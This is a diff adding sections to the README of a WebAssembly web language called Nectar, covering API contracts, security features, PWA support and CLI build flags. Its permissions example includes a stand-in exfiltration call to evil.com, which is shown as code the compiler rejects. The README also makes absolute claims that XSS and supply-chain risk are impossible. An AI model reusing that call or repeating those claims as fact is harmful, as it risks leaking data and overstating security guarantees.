@@ -22,6 +22,10 @@ Modern web development forces you to choose: **safety** (Rust, but no UI story),
 | Output | Native binary | JavaScript bundle | WebAssembly |
 | UI primitives | None (3rd party) | Components | Components, stores, routers, agents |
 | AI integration | None | Library | First-class (`agent`, `tool`, `prompt`) |
+| API safety | Manual | Types erased at runtime | Contracts — compile-time + runtime + wire-level |
+| Security | Manual / opt-in | `dangerouslySetInnerHTML` exists | XSS impossible, `secret` types, capability permissions |
+| Mobile/PWA | Library (Workbox, etc.) | Library | First-class (`app`, `offline`, `gesture`, `haptic`) |
+| Supply chain | npm (1000s of deps) | npm (1000s of deps) | Zero JS dependencies — flat WASM binary |
 | Bundle size | N/A | 40-150 KB runtime | ~0 KB runtime overhead |
 
 Nectar was designed from the ground up with these principles:
@@ -29,6 +33,9 @@ Nectar was designed from the ground up with these principles:
 - **No GC, ever.** Ownership and borrowing at the language level means predictable, zero-pause memory management.
 - **O(1) reactive updates.** Signals track dependencies at compile time. When state changes, only the exact DOM nodes that depend on it are updated -- no diffing, no reconciliation.
 - **AI-native.** The `agent` keyword, `tool` definitions, and `prompt` templates are part of the grammar, not a library. Build AI-powered interfaces with the same safety guarantees as the rest of your code.
+- **API boundary safety.** The `contract` keyword defines the shape of external data. The compiler checks field access, the runtime validates responses in WASM, and a content hash on the wire catches backend drift. The entire class of FE/BE data mismatch bugs is eliminated.
+- **Security by elimination.** XSS is structurally impossible -- the rendering pipeline has no `innerHTML`. Prototype pollution cannot happen -- WASM linear memory has no prototype chain. The `secret` keyword prevents sensitive data from being logged or rendered. `permissions` blocks restrict component capabilities at compile time. There are zero JavaScript dependencies -- no `node_modules`, no supply chain risk.
+- **Mobile-native PWA.** The `app` keyword generates PWA manifests, service workers, and offline strategies. `gesture` blocks handle swipes, long-press, and pinch. `haptic` provides vibration feedback. Nectar apps install to the home screen, work offline, and feel native -- not like a web page in a browser frame.
 - **One toolchain.** Compiler, formatter, linter, test runner, dev server, package manager, and LSP -- all in one binary.
 
 ---
@@ -422,6 +429,238 @@ try {
 }
 ```
 
+### Contracts — API Boundary Safety
+
+Contracts are Nectar's solution to the most common class of frontend bugs: **data shape mismatches between frontend and backend**. They enforce the shape of external data (API responses, WebSocket messages, etc.) at three levels:
+
+1. **Compile-time** — If you access a field that doesn't exist on the contract, the compiler catches it. Not the user's browser three weeks later.
+2. **Runtime boundary validation** — Every API response is validated in WASM before it enters your app. Malformed data never propagates. External data is **untrusted by default**, like Rust's `unsafe` boundary.
+3. **Wire-level staleness detection** — A content hash is embedded in every request. If the backend was built against a different contract version, the mismatch is caught on the first request.
+
+```nectar
+// Define the shape of an API response
+contract CustomerResponse {
+    id: u32,
+    name: String,
+    email: String,
+    balance_cents: i64,
+    tier: enum { free, pro, enterprise },
+    created_at: String,
+    deleted_at: String?,   // nullable field
+}
+
+// fetch -> ContractName validates the response at the boundary
+let customer = await fetch("/api/customers/42") -> CustomerResponse;
+
+// Compile-time checked field access:
+let name = customer.name;       // OK
+let tier = customer.tier;       // OK
+let x = customer.display_name;  // COMPILE ERROR: contract CustomerResponse
+                                // has no field display_name
+```
+
+Every request with a contract binding automatically includes a hash header:
+
+```
+GET /api/customers/42
+X-Nectar-Contract: CustomerResponse@a3f8b2c1
+```
+
+The backend middleware checks this hash against the contract it was built with. If they don't match, you get an immediate, actionable error — not `undefined is not a function` three clicks deep.
+
+#### Contract Export
+
+The compiler can export contracts as JSON Schema, OpenAPI, or Protobuf definitions for backend teams:
+
+```bash
+nectar export-contracts --format jsonschema  > schemas/
+nectar export-contracts --format openapi     > api-spec.yaml
+nectar export-contracts --format protobuf    > contracts.proto
+```
+
+The frontend is the source of truth for the API shape it consumes. The backend validates against the same contract in CI. If their response shape drifts, **their build fails** — not the users' browsers.
+
+| Approach | Compile-time | Runtime | Backend-agnostic | Zero-cost when valid |
+|---|---|---|---|---|
+| TypeScript types | Yes | **No** (erased) | Yes | N/A |
+| Zod/io-ts | No | Yes | Yes | No (JS overhead) |
+| tRPC | Yes | Yes | **No** (TS only) | No |
+| GraphQL | Partial | Partial | Yes | No |
+| **Nectar contracts** | **Yes** | **Yes** | **Yes** | **Yes** (WASM) |
+
+### Security
+
+Nectar makes entire vulnerability classes **structurally impossible** at the language level -- not through best practices or linting, but by eliminating the mechanisms that enable them.
+
+#### XSS Is Impossible
+
+The WASM-to-DOM bridge only exposes `setText()` (which sets `textContent`) and `setAttribute()`. There is no `innerHTML`, no `dangerouslySetInnerHTML`, no `eval()`, no `document.write()`. The language **does not have a mechanism** to inject raw HTML. This is not a lint rule you can disable -- the capability does not exist.
+
+#### Prototype Pollution Is Impossible
+
+WASM linear memory is a flat byte array. There is no `__proto__`, no `constructor.prototype`, no `Object.assign` spreading attacker-controlled keys into your object tree. An entire class of supply chain attacks evaporates because the attack surface does not exist.
+
+#### Zero Supply Chain Risk
+
+Nectar compiles to a flat WASM binary. There is no `node_modules` directory with 1,400 transitive dependencies, no `postinstall` scripts running arbitrary code, no lodash version conflict. The attack surface is the Nectar runtime (which you audit once) and your own code.
+
+#### Secret Types
+
+The `secret` modifier prevents sensitive values from being logged, serialized to JSON, rendered to the DOM, or leaked through error messages. The compiler enforces this -- not a code review.
+
+```nectar
+let secret api_key: String = env("STRIPE_KEY");
+let secret password: String = form.password;
+
+// COMPILE ERROR: cannot pass secret value to non-secret context
+console.log(api_key);          // error: cannot log secret value
+setText(el, password);         // error: cannot render secret to DOM
+json.serialize(api_key);       // error: cannot serialize secret
+
+// OK: secret flows to secret-accepting functions
+stripe.charge(api_key, amount);
+hash(password);
+```
+
+#### Capability-Based Permissions
+
+Components declare what they can access. The compiler enforces it. A component that does not declare network access cannot call `fetch`.
+
+```nectar
+component PaymentForm() {
+    permissions {
+        network: ["https://api.stripe.com/*"],
+        storage: ["session:auth_token"],
+    }
+
+    // OK: URL matches declared network permission
+    let charge = await fetch("https://api.stripe.com/v1/charges") -> ChargeResponse;
+
+    // COMPILE ERROR: URL not in declared permissions
+    let leak = await fetch("https://evil.com/steal");
+    //                      ^^^^^^^^^^^^^^^^^^^^^^^^
+    //  error: fetch URL does not match any declared network permission
+
+    render {
+        <form on:submit={self.handle_pay}>
+            <input type="text" bind:value={card_number} />
+            <button>"Pay Now"</button>
+        </form>
+    }
+}
+```
+
+#### Automatic CSP Generation
+
+The compiler analyzes every `fetch()` URL, image source, and font reference in your code and emits a tight Content-Security-Policy header:
+
+```bash
+nectar build app.nectar --emit-csp
+# default-src 'self'; connect-src https://api.payhive.com https://api.stripe.com; ...
+```
+
+No manual CSP authoring. No accidentally leaving `unsafe-inline`. The policy is derived from the code.
+
+### Progressive Web App (PWA)
+
+Nectar apps are mobile-native by default. The `app` keyword replaces the need for separate PWA tooling, service worker libraries, and manifest generators.
+
+#### App Declaration
+
+```nectar
+app PayHive {
+    manifest {
+        name: "PayHive",
+        short_name: "PayHive",
+        theme_color: "#303234",
+        background_color: "#303234",
+        display: "standalone",
+        orientation: "portrait",
+    }
+
+    offline {
+        precache: ["/", "/app", "/app/schedule", "/app/customers"],
+        strategy: "stale-while-revalidate",
+        fallback: OfflinePage,
+    }
+
+    push {
+        vapid_key: env("VAPID_PUBLIC_KEY"),
+        on_message: handle_push,
+    }
+
+    router AppRouter {
+        route "/" => Home,
+        route "/app" => Dashboard,
+        route "/app/schedule" => Schedule,
+    }
+}
+```
+
+The compiler generates:
+- `manifest.webmanifest` for Add to Home Screen / app install
+- A service worker with precaching and runtime caching
+- App shell HTML that loads instantly from cache
+- Splash screen matching the manifest theme
+
+The result is a **standalone app** with no browser chrome -- it looks and feels like a native mobile app.
+
+#### Gestures
+
+First-class gesture recognition eliminates the need for gesture libraries like Hammer.js:
+
+```nectar
+component ScheduleView() {
+    gesture swipe_left {
+        navigate("/app/schedule/next-week");
+    }
+
+    gesture swipe_down {
+        self.refresh();
+    }
+
+    gesture long_press on:customer_card {
+        self.show_context_menu();
+        haptic("medium");
+    }
+
+    render {
+        <div class="schedule">
+            // ...
+        </div>
+    }
+}
+```
+
+#### Hardware Access
+
+Native device APIs are first-class language constructs:
+
+```nectar
+// Biometric authentication (WebAuthn)
+let credential = await biometric.authenticate({
+    challenge: server_challenge,
+    rp: "payhive.com",
+});
+
+// Camera for document scanning
+let photo = await camera.capture({ facing: "rear" });
+
+// GPS for field service
+let location = await geolocation.current();
+
+// Haptic feedback
+haptic("success");
+```
+
+#### Distribution
+
+```bash
+nectar build app.nectar --target pwa          # PWA — installable from browser
+nectar build app.nectar --target twa          # Android Trusted Web Activity (Play Store)
+nectar build app.nectar --target capacitor    # iOS/Android native wrapper (App Store)
+```
+
 ### String Interpolation
 
 ```nectar
@@ -808,6 +1047,39 @@ nectar add ui --features "dark,icons" # Add with features
 nectar install                        # Resolve and download all dependencies
 ```
 
+### `nectar build --target`
+
+Build for different deployment targets.
+
+```bash
+nectar build app.nectar --target pwa          # PWA with manifest + service worker
+nectar build app.nectar --target twa          # Android Trusted Web Activity wrapper
+nectar build app.nectar --target capacitor    # iOS/Android native wrapper
+nectar build app.nectar --emit-csp            # Emit Content-Security-Policy header
+```
+
+| Flag | Description |
+|---|---|
+| `--target pwa` | Generate `manifest.webmanifest`, service worker, app shell HTML |
+| `--target twa` | Generate Android TWA wrapper for Google Play Store distribution |
+| `--target capacitor` | Generate Capacitor project for iOS App Store / Google Play |
+| `--emit-csp` | Analyze all resource URLs and emit a tight Content-Security-Policy |
+
+### `nectar export-contracts`
+
+Export contract definitions as JSON Schema, OpenAPI, or Protobuf for backend teams.
+
+```bash
+nectar export-contracts app.nectar --format jsonschema   # JSON Schema files
+nectar export-contracts app.nectar --format openapi      # OpenAPI components/schemas
+nectar export-contracts app.nectar --format protobuf     # Protocol Buffers .proto
+```
+
+| Flag | Description |
+|---|---|
+| `--format` | Output format: `jsonschema` (default), `openapi`, `protobuf` |
+| `--output`, `-o` | Output directory (default: stdout) |
+
 ### `--lsp`
 
 Start the Language Server Protocol server for editor integration (completion, diagnostics, go-to-definition).
@@ -927,6 +1199,9 @@ The `examples/` directory contains complete programs demonstrating Nectar's feat
 | [`app.nectar`](examples/app.nectar) | Full application -- routing, scoped styles, route guards, `<Link>` navigation |
 | [`api.nectar`](examples/api.nectar) | API communication -- fetch, async/await, GET/POST/DELETE, error handling |
 | [`ai-chat.nectar`](examples/ai-chat.nectar) | AI chat interface -- `agent` keyword, tool definitions, streaming responses |
+| [`contracts.nectar`](examples/contracts.nectar) | API boundary contracts -- compile-time field checking, runtime validation, content hashing |
+| [`security.nectar`](examples/security.nectar) | Security features -- `secret` types, `permissions` blocks, capability enforcement |
+| [`pwa-app.nectar`](examples/pwa-app.nectar) | Progressive Web App -- `app` manifest, offline caching, gestures, hardware access |
 
 Compile any example:
 
